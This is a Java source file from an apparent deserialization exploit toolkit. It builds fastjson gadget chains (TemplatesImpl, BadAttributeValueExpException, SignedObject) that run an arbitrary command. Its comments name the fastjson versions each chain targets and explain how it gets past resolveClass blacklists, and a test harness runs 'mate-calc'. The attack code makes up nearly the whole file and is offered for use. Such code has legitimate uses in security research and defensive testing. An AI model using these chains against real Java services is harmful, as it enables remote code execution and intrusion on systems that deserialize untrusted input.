package xyz.eki.marshalexp.gadget.fastjson;

import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import xyz.eki.marshalexp.gadget.jdk.GBadAttributeValueExpException;
import xyz.eki.marshalexp.gadget.jdk.GHashMap;
import xyz.eki.marshalexp.gadget.jdk.GSignedObject;
import xyz.eki.marshalexp.sink.jdk.GTemplates;
import xyz.eki.marshalexp.utils.ReflectUtils;
import xyz.eki.marshalexp.utils.SerializeUtils;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.security.KeyPair;
import java.security.KeyPairGenerator;
import java.security.Signature;
import java.security.SignedObject;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;

public class GFastJson {
    public static class MyInputStream extends ObjectInputStream {
        private final List<Object> BLACKLIST = Arrays.asList(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
                "com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter",
                "com.sun.syndication.feed.impl.ObjectBean",
                "import com.sun.syndication.feed.impl.ToStringBean");

        public MyInputStream(InputStream inputStream) throws IOException {
            super(inputStream);
        }

        protected Class<?> resolveClass(ObjectStreamClass cls) throws ClassNotFoundException, IOException {
            if (this.BLACKLIST.contains(cls.getName())) {
                throw new InvalidClassException("The class " + cls.getName() + " is on the blacklist");
            } else {
                return super.resolveClass(cls);
            }
        }
    }

    public static JSONObject toString2Getter(Object obj){
        JSONObject gadget = new JSONObject();
        gadget.put("eki",obj);
        return gadget;
    }


    /*
    bypass resolveClass with Reference
    fastjson > 1.2.48
    fastjson 2
     */
    public static Object toString2RCE_BypassWithReference(String cmd) throws Exception {
        TemplatesImpl templates = GTemplates.getEvilTemplates(cmd);

        JSONObject jsonObject = toString2Getter(templates);

        BadAttributeValueExpException bd = GBadAttributeValueExpException.deserialize2ToString(jsonObject);

        HashMap hashMap = new HashMap();
        hashMap.put(templates,bd);

        return hashMap;
    }

    /*
    bypass fastjson resolveClass with Reference
    bypass self defined resolveClass with SignedObject
    fastjson 2
    Notes: change fastjson to version 2
     */
    public static Object toString2RCE_BypassWithSignedObject(String cmd) throws Exception {
        TemplatesImpl templates = GTemplates.getEvilTemplates(cmd);
        JSONObject jsonObject = toString2Getter(templates);

        BadAttributeValueExpException bd = GBadAttributeValueExpException.deserialize2ToString(jsonObject);
        HashMap hashMap = new HashMap();
        hashMap.put(templates,bd);


        SignedObject signedObject = GSignedObject.getter2Deserialize(hashMap);
        JSONObject jsonObject1 = toString2Getter(signedObject);
        BadAttributeValueExpException bd1 = GBadAttributeValueExpException.deserialize2ToString(jsonObject1);

        return bd1;
    }

    /*
    fastjson <= 1.2.48
     */
    public static Object toString2RCE(String cmd) throws Exception {
        TemplatesImpl templates = GTemplates.getEvilTemplates(cmd);
        JSONObject jsonObject = toString2Getter(templates);
        BadAttributeValueExpException bd = GBadAttributeValueExpException.deserialize2ToString(jsonObject);

        return bd;
    }

    public static void testBlackList(Object o) throws Exception{
        byte[] serialize = SerializeUtils.serialize(o);
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(serialize);
        ObjectInputStream ois = new MyInputStream(byteArrayInputStream);
        ois.readObject();
        SerializeUtils.deserialize(serialize);
    }


    public static void main(String[] args) throws Exception {
        Object o = toString2RCE_BypassWithSignedObject("mate-calc");

        try {
            testBlackList(o);
        } catch (Exception e){
            ;
        }

        testBlackList(o);
//        SerializeUtils.deserialize(serialize);

    }
}
